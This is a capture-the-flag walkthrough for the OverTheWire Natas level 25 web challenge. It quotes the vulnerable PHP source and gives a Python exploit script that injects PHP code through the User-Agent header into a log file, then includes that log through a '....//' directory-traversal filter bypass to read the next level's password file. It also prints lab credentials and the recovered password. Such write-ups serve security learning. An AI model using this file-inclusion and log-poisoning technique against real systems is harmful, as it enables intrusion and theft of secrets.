# Natas 24 - Natas 25 
    Username  : natas25
    Password  : ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
    URL       : http://natas25.natas.labs.overthewire.org

# Solution
Looking at the source code :
```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```
In safeinclude function str_replace only runs once, so ....// becomes ../ after replacement.

In the log request function The log file path is /var/www/natas/natas25/logs/natas25_<session_id>.log

Attack:

    Inject PHP code in User-Agent header
    Use directory traversal to include our log file
    Python script:

python Script for the attack :
```
import requests
url = "[natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org/)"
auth = ("natas25", "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws")
session = requests.Session()

r = session.get(url, auth=auth)
session_id = session.cookies.get("PHPSESSID")

headers = {
    "User-Agent": "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>"
}

r = session.get(url, auth=auth, headers=headers, params={"lang": "en"})

payload = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + session_id + ".log"
r = session.get(url, auth=auth, params={"lang": payload})
print(r.text)

```
# Password
    cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
